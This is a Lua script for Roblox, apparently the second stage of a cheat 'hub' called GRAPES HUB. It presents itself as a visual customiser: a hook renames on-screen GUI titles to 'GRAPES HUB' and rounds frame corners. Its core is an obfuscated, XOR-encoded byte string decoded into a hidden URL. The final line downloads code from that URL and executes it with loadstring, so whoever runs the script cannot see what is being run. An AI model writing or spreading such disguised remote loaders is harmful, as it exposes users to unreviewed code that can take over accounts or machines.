
--[[ STAGE 2: VISUAL CORE ]]
local LEfvICNAdJVhWwA8MAZvtd="\185\206\182\137\133\176\176\130\135\182\179\180\179\202\201\217\221\216\189\202\156\155\151\157\168\215\193\197\233\189\197\213\215\178\217\168\219\222\236\212\226\178\209\229\233\229\239\229\219\232\238\224\229\227\231\241\229\215\177\241\253\230\243\182\244\245\251\002\247\240\247\001\242\192\246\006\002\246\003\012\005\010\024\026\026\220\027\030\003\223\022\017\025\041\020\022\027\043\031\046\033\031\035\023\036\042\041\225\059\022\056\230\231\243\061\059\048\049\038"local NjOKN4bH62ylE4s=136 local L4scItTfhbHCU=183 local Xxhp3vOP1Y1MBJ0LURY2=1 local MIc1Bw6ACH7OSDSprEjUG0=1 local AqMYlz8iubRRt9vcHk=24 local uLg5m0Nlnoqk0VOx=true local VyKVPYwZfGO9UXR=bit32 and bit32.bxor if not VyKVPYwZfGO9UXR then VyKVPYwZfGO9UXR=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local ZWjO5rQ9YQ73={}for KPlLLKTAHhYCbSAbgSHY=1,#LEfvICNAdJVhWwA8MAZvtd do local UVLJT9XO7TxvPW=string.byte(LEfvICNAdJVhWwA8MAZvtd,KPlLLKTAHhYCbSAbgSHY)local C7ENu6IOg3CBpL=(L4scItTfhbHCU+(KPlLLKTAHhYCbSAbgSHY*MIc1Bw6ACH7OSDSprEjUG0)+AqMYlz8iubRRt9vcHk)%256 if Xxhp3vOP1Y1MBJ0LURY2==0 then UVLJT9XO7TxvPW=(UVLJT9XO7TxvPW-C7ENu6IOg3CBpL)%256 ZWjO5rQ9YQ73[KPlLLKTAHhYCbSAbgSHY]=string.char(VyKVPYwZfGO9UXR(UVLJT9XO7TxvPW,NjOKN4bH62ylE4s))else UVLJT9XO7TxvPW=VyKVPYwZfGO9UXR(UVLJT9XO7TxvPW,NjOKN4bH62ylE4s)ZWjO5rQ9YQ73[KPlLLKTAHhYCbSAbgSHY]=string.char((UVLJT9XO7TxvPW-C7ENu6IOg3CBpL)%256)end end local nrN0PJUi0U64cqi7W5=table.concat(ZWjO5rQ9YQ73)if uLg5m0Nlnoqk0VOx then nrN0PJUi0U64cqi7W5=string.reverse(nrN0PJUi0U64cqi7W5)end local dy80tLpoPTnFxUcSUJko=nrN0PJUi0U64cqi7W5
local HubName = "GRAPES HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(dy80tLpoPTnFxUcSUJko))()
